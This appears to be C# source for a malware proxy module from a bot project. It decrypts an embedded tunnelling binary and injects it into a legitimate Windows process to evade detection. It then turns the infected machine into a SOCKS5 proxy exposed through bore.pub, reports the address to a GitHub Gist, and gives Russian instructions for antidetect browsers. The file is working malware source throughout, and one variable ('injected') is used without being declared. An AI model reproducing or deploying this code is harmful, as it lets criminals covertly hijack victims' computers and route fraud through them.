using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using VanguardCore;

namespace VanguardCore.Modules
{
    public class ProxyModule
    {
        private static bool _active = false;
        private static TcpListener _listener;
        private static IntPtr _hProcess = IntPtr.Zero;
        private static int _localPort = 4444;
        private static string _publicUrl = null;

        // [PRO STEALTH] legitimate system host processes for hollowing
        private static readonly string[] TARGET_HOSTS = {
            @"C:\Windows\System32\svchost.exe",
            @"C:\Windows\System32\conhost.exe",
            @"C:\Windows\System32\werfault.exe",
            @"C:\Windows\System32\taskhostw.exe"
        };

        public static bool IsActive => _active;

        public static async Task AutoRegisterAsync()
        {
            try
            {
                var info = await FinalBot.Modules.SystemInfoModule.GetCountryInfoAsync();
                string country = info.country.ToLower();
                
                bool isClean = false;
                foreach (var region in Constants.CLEAN_REGIONS)
                {
                    if (country.Contains(region.ToLower())) { isClean = true; break; }
                }

                if (isClean)
                {
                    Console.WriteLine($"[PROXY] Clean region detected ({country}). Starting auto-node...");
                    string result = await Start();
                    if (result.Contains("✅")) Console.WriteLine("[PROXY] Auto-node registered successfully.");
                }
            }
            catch { }
        }

        public static async Task<string> Start()
        {
            if (_active) return "[!] Proxy already running";

            try
            {
                // [PRO STEALTH] Load encrypted bore directly from embedded resources (NO DISK)
                string resourceName = "bore.bin";
                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                
                // Try multiple prefix variants matching csproj/AOT behavior
                string[] possibleNames = { resourceName, $"VanguardCore.{resourceName}", $"MicrosoftManagementSvc.{resourceName}" };
                Stream stream = null;
                foreach (var name in possibleNames) {
                    stream = assembly.GetManifestResourceStream(name);
                    if (stream != null) break;
                }

                if (stream == null) return "[!] bore.bin resource not found in binary";

                byte[] encrypted;
                using (var ms = new MemoryStream()) {
                    await stream.CopyToAsync(ms);
                    encrypted = ms.ToArray();
                }

                // [PRO STEALTH] Use global AES-GCM decryption
                byte[] payload = AesHelper.Decrypt(encrypted);
                if (payload == null) return "[!] Failed to decrypt bore.bin (Key mismatch?)";

                _listener = new TcpListener(IPAddress.Loopback, _localPort);
                _listener.Start();
                _active = true;

                _ = Task.Run(() => AcceptClients());

                // Start a legitimate host process with redirected output
                ProcessStartInfo psi = new ProcessStartInfo(@"C:\Windows\System32\taskhostw.exe", $"local {_localPort} --to bore.pub");
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                Process hostProc = Process.Start(psi);
                
                if (hostProc != null)
                {
                    Thread.Sleep(500); // Allow modules and DLLs to load
                    if (InjectionService.ModuleOverloading("taskhostw", payload))
                    {
                        injected = true;
                        _hProcess = hostProc.Handle;
                    }
                }

                if (!injected) {
                    Stop();
                    hostProc?.Kill();
                    return "[!] Failed to start stealth tunnel (Injection fail)";
                }

                // Wait for port from process output (timeout 15s)
                string output = "";
                DateTime start = DateTime.Now;
                using (var reader = hostProc.StandardOutput)
                {
                    while ((DateTime.Now - start).TotalSeconds < 15)
                    {
                        string line = await reader.ReadLineAsync();
                        if (line != null)
                        {
                            output += line + "\n";
                            var match = Regex.Match(line, @"bore\.pub:(\d+)", RegexOptions.IgnoreCase);
                            if (match.Success)
                            {
                                string port = match.Groups[1].Value;
                                _publicUrl = $"bore.pub:{port}";
                                await GistManager.UpdateFile(Constants.GIST_MESH_FILENAME, _publicUrl);
                                
                                return $"✅ <b>SOCKS5 прокси запущен!</b>\n\n" +
                                       $"🌐 <b>Адрес:</b> <code>{_publicUrl}</code>\n\n" +
                                       $"📱 <b>В антидетект браузере:</b>\n" +
                                       $"• Тип: <code>SOCKS5</code>\n" +
                                       $"• Host: <code>bore.pub</code>\n" +
                                       $"• Port: <code>{port}</code>";
                            }
                        }
                        else await Task.Delay(100);
                    }
                }

                Stop();
                return "[!] Bore timeout. Output:\n" + output;
            }
            catch (Exception ex)
            {
                Stop();
                return $"[!] Error: {ex.Message}";
            }
        }

        public static void Stop()
        {
            _active = false;
            _publicUrl = null;
            try { _listener?.Stop(); } catch { }
            if (_hProcess != IntPtr.Zero)
            {
                try { 
                    // [PRO NOTE] We don't have a direct Kill for IntPtr in C#, 
                    // usually we'd use TerminateProcess or just let it close with parent.
                    SyscallManager.Initialize();
                    var ntTerminate = SyscallManager.GetSyscallDelegate<SyscallManager.NtTerminateProcess>("NtTerminateProcess");
                    ntTerminate?.Invoke(_hProcess, 0);
                } catch { }
                _hProcess = IntPtr.Zero;
            }
        }

        private static async Task AcceptClients()
        {
            while (_active)
            {
                try
                {
                    var client = await _listener.AcceptTcpClientAsync();
                    _ = Task.Run(() => HandleClient(client));
                }
                catch { if (!_active) break; }
            }
        }

        private static async Task HandleClient(TcpClient client)
        {
            using (client)
            using (var stream = client.GetStream())
            {
                try
                {
                    byte[] firstByte = new byte[1];
                    int read = await stream.ReadAsync(firstByte, 0, 1);
                    if (read == 0) return;
                    if (firstByte[0] == 0x05) await HandleSocks5(stream);
                }
                catch { }
            }
        }

        private static async Task HandleSocks5(NetworkStream stream)
        {
            byte[] nmethodsB = new byte[1];
            await stream.ReadAsync(nmethodsB, 0, 1);
            byte[] methods = new byte[nmethodsB[0]];
            await stream.ReadAsync(methods, 0, methods.Length);
            await stream.WriteAsync(new byte[] { 0x05, 0x00 }, 0, 2);

            byte[] reqHeader = new byte[4];
            await stream.ReadAsync(reqHeader, 0, 4);
            if (reqHeader[1] != 0x01) return;

            string host = "";
            int port = 0;

            if (reqHeader[3] == 0x01) {
                byte[] addr = new byte[4];
                await stream.ReadAsync(addr, 0, 4);
                host = $"{addr[0]}.{addr[1]}.{addr[2]}.{addr[3]}";
            }
            else if (reqHeader[3] == 0x03) {
                byte[] lenB = new byte[1];
                await stream.ReadAsync(lenB, 0, 1);
                byte[] hostB = new byte[lenB[0]];
                await stream.ReadAsync(hostB, 0, hostB.Length);
                host = Encoding.UTF8.GetString(hostB);
            }

            byte[] portB = new byte[2];
            await stream.ReadAsync(portB, 0, 2);
            port = (portB[0] << 8) | portB[1];

            try {
                using (var remoteClient = new TcpClient()) {
                    await remoteClient.ConnectAsync(host, port);
                    await stream.WriteAsync(new byte[] { 0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }, 0, 10);
                    using (var remoteStream = remoteClient.GetStream()) {
                        var t1 = stream.CopyToAsync(remoteStream);
                        var t2 = remoteStream.CopyToAsync(stream);
                        await Task.WhenAny(t1, t2);
                    }
                }
            }
            catch { await stream.WriteAsync(new byte[] { 0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }, 0, 10); }
        }
    }
}
